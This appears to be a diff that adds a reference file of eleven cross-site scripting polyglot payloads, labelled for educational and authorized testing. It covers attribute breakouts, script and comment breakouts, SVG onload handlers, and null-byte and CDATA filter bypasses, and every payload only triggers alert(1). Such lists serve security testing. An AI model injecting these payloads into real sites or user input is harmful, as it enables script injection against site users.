@@ -1,0 +1,79 @@
+# XSS Polyglot Payloads
+
+Note:
+Polyglot payloads are useful when the injection context is unknown,
+as they are designed to execute in multiple parsing environments.
+
+# Purpose:
+# Polyglot payloads are designed to execute in multiple contexts
+# (HTML, attribute, JavaScript, URL, etc.) simultaneously.
+
+⚠️ For educational and authorized testing only.
+
+----------------------------------------
+1. JavaScript URL Polyglot
+Payload: javascript://%250Aalert(1)//
+Description: Works in URL and script contexts.
+Use Case: Injection in href/src fields.
+
+----------------------------------------
+2. Attribute Break + Event
+Payload: " onmouseover=alert(1) //
+Description: Breaks attribute and injects event handler.
+Use Case: Input inside HTML attributes.
+
+----------------------------------------
+3. Multi-Context Script Injection
+Payload: '">"><script>alert(1)</script>
+Description: Breaks out of multiple contexts.
+Use Case: Unknown injection location.
+
+----------------------------------------
+4. Advanced Polyglot (HTML + JS + SVG)
+Payload: javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+Description: Works across multiple parsing contexts.
+Use Case: Complex filter bypass scenarios.
+
+----------------------------------------
+5. Attribute Injection Variant
+Payload: " ' type=image src=1 onerror=alert(1)
+Description: Injects event handler via attribute confusion.
+Use Case: Weak attribute validation.
+
+----------------------------------------
+6. SVG Polyglot
+Payload: '"><svg/onload=alert(1)>
+Description: Executes in SVG and HTML contexts.
+Use Case: Bypass script filtering.
+
+----------------------------------------
+7. Script Breakout
+Payload: //--></script><script>alert(1)</script>
+Description: Escapes existing script block.
+Use Case: Injection inside <script> context.
+
+----------------------------------------
+8. Autofocus Event Injection
+Payload: " autofocus onfocus=alert(1) style="
+Description: Auto-trigger via focus event.
+Use Case: Minimal user interaction required.
+
+----------------------------------------
+9. Null Byte Injection
+Payload: %00"><script>alert(1)</script>
+Description: Uses null byte to bypass filters.
+Use Case: Poorly implemented sanitization.
+
+----------------------------------------
+10. Comment Breakout
+Payload: <!--<img src="--><img src=x onerror=alert(1)//">
+Description: Escapes HTML comments.
+Use Case: Injection inside comments.
+
+----------------------------------------
+11. CDATA Obfuscation
+Payload: <script>/*<![CDATA[*/alert(1)/*]]>*/</script>
+Description: Uses CDATA to hide script.
+Use Case: Bypass XML/HTML hybrid filters.
+
+----------------------------------------
